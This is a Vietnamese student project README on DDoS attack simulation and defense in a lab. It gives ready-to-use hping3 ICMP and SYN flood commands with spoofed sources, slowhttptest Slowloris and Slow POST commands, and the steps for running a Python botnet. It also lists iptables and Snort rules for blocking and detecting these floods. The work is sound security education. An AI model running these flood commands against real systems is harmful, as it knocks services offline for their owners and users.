# 🛡️ DDoS Attack & Defense Research

[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)](https://www.python.org/)
[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Research](https://img.shields.io/badge/Type-Research-red)](#)


## 📌 Tổng quan

Dự án nghiên cứu chuyên sâu về **Tấn công từ chối dịch vụ phân tán (DDoS)** và các giải pháp phòng chống. Báo cáo hệ thống hóa kiến thức từ lý thuyết đến thực nghiệm, bao gồm mô phỏng tấn công bằng các công cụ phổ biến và triển khai các lớp phòng thủ đa tầng.


## 🎯 Mục tiêu

- 🔍 Hệ thống hóa lý thuyết về DDoS, Botnet và các kỹ thuật tấn công.
- ⚔️ Mô phỏng tấn công SYN Flood, UDP Flood, ICMP Flood, HTTP Flood.
- 🐍 Xây dựng mạng botnet đơn giản bằng Python (Py-Botnet).
- 🛡️ Triển khai giải pháp phòng chống: IPtables, Snort IDS, Packet Sniffer Python.

## ⚙️ Công nghệ sử dụng

**Tấn công**
- `Hping3` – Tạo gói tin TCP/IP tùy chỉnh cho SYN Flood, ICMP Flood
- `Slowhttptest` – Mô phỏng tấn công HTTP Flood (Slowloris, Slow POST)
- `Py-Botnet` – Mạng botnet Python với C&C Server và Client

**Phòng thủ**
- `IPtables` – Tường lửa Linux, lọc và chặn gói tin theo quy tắc
- `Snort IDS` – Hệ thống phát hiện xâm nhập mạng dựa trên rules

**Phân tích**
- `Wireshark` – Bắt và phân tích lưu lượng mạng
- `Packet Sniffer (Python)` – Công cụ phân tích lưu lượng, xác định nguồn tấn công

**Môi trường**
- Python 3.10+
- Ubuntu Linux / VMware Lab

## 📁 Cấu trúc dự án

```text
ddos-attack-defense/
├── README.md
├── LICENSE
├── .gitignore
├── src/
│   ├── Server.py          # C&C Server điều khiển botnet
│   └── Client.py          # Bot thực hiện UDP Flood
├── docs/
│   └── DDoS attacks and prevention methods.pdf
└── images/
    ├── architecture/
    ├── attack/
    │   ├── http-flood/
    │   ├── icmp-flood/
    │   ├── py-botnet/
    │   └── syn-flood/
    └── defense/
        ├── iptables/
        ├── python-sniffer/
        └── snort/
```

## 🚀 Hướng dẫn cài đặt & chạy

### 1. Yêu cầu hệ thống

- Ubuntu Linux (hoặc WSL trên Windows)
- Python 3.10+
- Quyền `sudo`

### 2. Cài đặt công cụ

**Cập nhật hệ thống:**
```bash
sudo apt update
```

**Cài Python và môi trường ảo:**
```bash
sudo apt install python3 python3-venv -y
```

**Cài thư viện Python:**
```bash
pip install joblib pandas scikit-learn scapy
```

**Cài công cụ tấn công và phòng thủ:**
```bash
sudo apt install hping3 nmap wireshark snort iptables -y
```

### 3. Tấn công bằng Hping3

**ICMP Flood (Ping Flood):**
```bash
hping3 -1 --flood <IP_đích>
```

Ví dụ:
```bash
hping3 -1 --flood 192.168.1.100
```

**SYN Flood:**
```bash
hping3 -S <IP_đích> -p <cổng> -d 500 --flood --rand-source
```

Ví dụ:
```bash
hping3 -S 192.168.1.100 -p 80 -d 500 --flood --rand-source
```

### 4. Tấn công bằng Slowhttptest

**HTTP GET Flood (Slowloris):**
```bash
slowhttptest -c 1000 -H -g -o slowloris_report -i 10 -r 200 -t GET -u http://<IP_đích> -x 24 -p 3
```

Ví dụ:
```bash
slowhttptest -c 1000 -H -g -o slowloris_report -i 10 -r 200 -t GET -u http://192.168.1.100 -x 24 -p 3
```

**HTTP POST Flood (Slow POST):**
```bash
slowhttptest -c 1000 -B -g -o slowpost_report -i 110 -r 200 -s 8192 -t POST -u http://<IP_đích> -x 10 -p 3
```

Ví dụ:
```bash
slowhttptest -c 1000 -B -g -o slowpost_report -i 110 -r 200 -s 8192 -t POST -u http://192.168.1.100 -x 10 -p 3
```

### 5. Chạy Py-Botnet

**Terminal 1 - Server (C&C):**
```bash
python3 src/Server.py
```

**Terminal 2 - Client (Bot):**
```bash
python3 src/Client.py
```

**Trên Server, gửi lệnh tấn công:**
```text
attack <IP_đích> <port> <thời_gian> <số_luồng>
```

Ví dụ:
```text
attack 192.168.1.100 80 100 200
```

### 6. Phòng chống với IPtables

**Chặn đích danh IP tấn công:**
```bash
sudo iptables -A INPUT -s <IP_tấn_công> -j DROP
```

Ví dụ:
```bash
sudo iptables -A INPUT -s 192.168.1.10 -j DROP
```

**Giới hạn SYN Flood:**
```bash
sudo iptables -A INPUT -p tcp --syn -m limit --limit 3/s --limit-burst 5 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP
```

**Chặn ICMP Flood:**
```bash
sudo iptables -A INPUT -p icmp -j DROP
```

**Chặn UDP Flood:**
```bash
sudo iptables -A INPUT -p udp --dport 80 -j DROP
```

**Xem các rules đã cấu hình:**
```bash
sudo iptables -L -n -v
```

### 7. Phát hiện tấn công với Snort IDS

**Chạy Snort ở chế độ console:**
```bash
sudo snort -A console -q -u snort -g snort -c /etc/snort/snort.conf -i ens33
```

**Rule phát hiện ICMP Flood (thêm vào /etc/snort/local.rules):**
```text
alert icmp any any -> $HOME_NET any (msg:"ICMP Flood Detected"; threshold:type threshold, track by_dst, count 50, seconds 5; sid:1000001; rev:1;)
```

**Rule phát hiện SYN Flood (thêm vào /etc/snort/local.rules):**
```text
alert tcp any any -> $HOME_NET 80 (msg:"SYN Flood Detected"; flags:S; threshold:type threshold, track by_dst, count 100, seconds 10; sid:1000002; rev:1;)
```

### 8. Phân tích lưu lượng với Packet Sniffer Python

**Chạy Packet Sniffer:**
```bash
python3 packet_sniffer.py
```

*(Lưu ý: Packet Sniffer là công cụ phân tích lưu lượng, không phải tấn công. Nó giúp xác định nguồn tấn công và loại tấn công.)*

## 📸 Kết quả thực nghiệm

Dưới đây là các hình ảnh từ quá trình thực nghiệm. Toàn bộ ảnh được tổ chức trong thư mục [`images/`](images/).

### 1. ICMP Flood (Hping3)

<img width="601" height="132" alt="result-attack" src="https://github.com/user-attachments/assets/8ce21768-a41d-434c-aad2-01bfb900de62" />
*Tốc độ nhận tăng vọt lên 49.6 Mbps, hệ thống bắt đầu bị quá tải.*

<img width="1020" height="720" alt="wireshark-imcp" src="https://github.com/user-attachments/assets/26f9caa6-5112-4395-9d52-0aaf1bc3a5a9" />
*Wireshark ghi nhận hàng loạt gói tin ICMP từ máy tấn công.*

### 2. SYN Flood (Hping3)

<img width="663" height="590" alt="after-attack" src="https://github.com/user-attachments/assets/189ccff7-d614-4cf9-8c23-915813e8d6b7" />
*CPU tăng lên 31%, Memory 93%, tốc độ nhận lên tới 439 Mbps.*

<img width="1008" height="631" alt="wireshark-syn" src="https://github.com/user-attachments/assets/8a52a76a-6ab1-4a46-9ceb-9a5060dc71cf" />
*Wireshark ghi nhận hàng loạt gói tin SYN từ nhiều IP giả mạo.*

### 3. HTTP Flood (Slowhttptest)

**HTTP GET Flood (Slowloris):**

<img width="602" height="530" alt="slowhttptest-get" src="https://github.com/user-attachments/assets/195d6aaf-f7ee-4aaf-a82a-c41d7c212729" />
*Kết quả tấn công GET: 660 kết nối đang hoạt động, dịch vụ không khả dụng.*

<img width="917" height="582" alt="image" src="https://github.com/user-attachments/assets/84a40be8-0d68-4412-a3f3-bcfed3a80dca" />
*Biểu đồ báo cáo cho thấy Service available giảm về 0.*

**HTTP POST Flood (Slow POST):**

<img width="942" height="630" alt="image" src="https://github.com/user-attachments/assets/22df89f8-33f6-46bb-84db-f0ac53315a35" />
*Kết quả tấn công POST: 660 kết nối đang hoạt động, dịch vụ không khả dụng.*

<img width="989" height="567" alt="image" src="https://github.com/user-attachments/assets/92de4a3b-0fad-4ca4-91c1-c842f5f1a58a" />
*Biểu đồ báo cáo tương tự, Service available giảm về 0.*

<img width="965" height="546" alt="image" src="https://github.com/user-attachments/assets/97239537-b1ea-45f9-8e37-d272f5b8b2d9" />
*Web server ngừng phản hồi, không thể truy cập.*

### 4. Py-Botnet (Botnet Python)

<img width="965" height="505" alt="image" src="https://github.com/user-attachments/assets/126bb692-338a-4733-bed8-65615810713e" />
*Server hiển thị danh sách bot đã kết nối và lệnh tấn công.*

<img width="1001" height="688" alt="image" src="https://github.com/user-attachments/assets/1dfdcb7c-a7b7-4005-8d74-c773807bb693" />
*CPU tăng 34%, Memory 93%, tốc độ nhận 270 Mbps.*

<img width="999" height="544" alt="image" src="https://github.com/user-attachments/assets/eb25f6f9-517e-49d6-9513-33b72f7c4fe6" />
*Wireshark ghi nhận hàng loạt gói tin UDP với dữ liệu rác (ký tự "A").*

### 5. Phòng chống với IPtables

<img width="955" height="371" alt="image" src="https://github.com/user-attachments/assets/903d3252-8646-437e-b4f4-abbcc2f5eab8" />
*Chặn địa chỉ IP tấn công, không nhận được phản hồi.*

<img width="945" height="400" alt="image" src="https://github.com/user-attachments/assets/28834e0f-0a62-4bf6-893a-349d88060990" />
*Giới hạn số lượng gói SYN/giây, chỉ 1 gói được ACCEPT, còn lại bị DROP.*

<img width="888" height="410" alt="image" src="https://github.com/user-attachments/assets/67f72588-80fa-4196-8a78-3237cd9d9caf" />
*1383K gói tin ICMP (39MB) bị chặn hoàn toàn.*

<img width="1038" height="381" alt="image" src="https://github.com/user-attachments/assets/db48e412-94c8-406b-b09e-59822e4b8f1a" />
*1026K gói tin UDP (29MB) bị chặn.*

### 6. Phát hiện tấn công với Snort IDS

<img width="930" height="540" alt="image" src="https://github.com/user-attachments/assets/c83ae9d8-19b9-4ca2-8f58-36fe879796b5" />
*Snort phát hiện và cảnh báo ICMP Flood.*

<img width="934" height="529" alt="image" src="https://github.com/user-attachments/assets/9ca1b389-6aa8-4e56-8a6d-9db4bd9c6c60" />
*Snort phát hiện và cảnh báo SYN Flood.*

### 7. Phân tích lưu lượng với Packet Sniffer Python

<img width="1038" height="457" alt="image" src="https://github.com/user-attachments/assets/00426a60-41a4-4aca-8fcf-7e10d1bc61fb" />
*Lưu lượng ping bình thường không bị phát hiện là tấn công.*

<img width="1039" height="517" alt="image" src="https://github.com/user-attachments/assets/4c0eb049-8d1e-4655-bb25-bb080902edae" />
*Phát hiện chính xác các gói tin ICMP, SYN, UDP với số lượng lớn.*

<img width="1039" height="449" alt="image" src="https://github.com/user-attachments/assets/d4629607-a6ed-4661-8b0a-ea7f9d031aa8" />
*Phát hiện số lượng lớn request HTTP GET và POST.*

<img width="1039" height="475" alt="image" src="https://github.com/user-attachments/assets/a25622aa-169a-4bcb-b6ee-22b0d9bef76d" />
*Phát hiện tấn công DDoS.*

<img width="1039" height="475" alt="image" src="https://github.com/user-attachments/assets/3cc77c1c-0fcd-4346-8185-c782494d5c70" />
*Phát hiện đầy đủ các dạng tấn công trong môi trường đa tấn công.*

## 🛡️ Giải pháp phòng chống

**IPtables**
- Chặn địa chỉ IP nguồn tấn công
- Giới hạn số lượng gói SYN/giây để ngăn SYN Flood
- Lọc giao thức ICMP và UDP

**Snort IDS**
- Phát hiện tấn công dựa trên rules
- Cảnh báo thời gian thực

**Packet Sniffer (Python)**
- Phân tích lưu lượng mạng
- Xác định nguồn và loại tấn công

## ⚠️ Disclaimer

> **Dự án này chỉ dành cho mục đích học tập và nghiên cứu.**  
> ❌ Không sử dụng để tấn công hệ thống thực tế.  
> ❌ Không sử dụng khi chưa có sự cho phép.  
> ✅ Chỉ thực nghiệm trong môi trường Lab hoặc mạng riêng.  
> ✅ Mục đích duy nhất là nâng cao kiến thức về an ninh mạng.

Việc sử dụng trái phép có thể vi phạm pháp luật. Người dùng tự chịu trách nhiệm về hành vi của mình.

## 👥 Tác giả

- **Nguyễn Trung Kiên** – AT200432
- **Nguyễn Văn Khánh** – AT200430
- **Vũ Trọng Khang** – AT200130
- **Nguyễn Công Khánh** – AT200131
- **Đinh Trí Đức** – AT200114

## 📄 Giấy phép

Dự án được phân phối dưới giấy phép MIT. Xem file [LICENSE](LICENSE) để biết thêm chi tiết.

*Hà Nội – 2026*
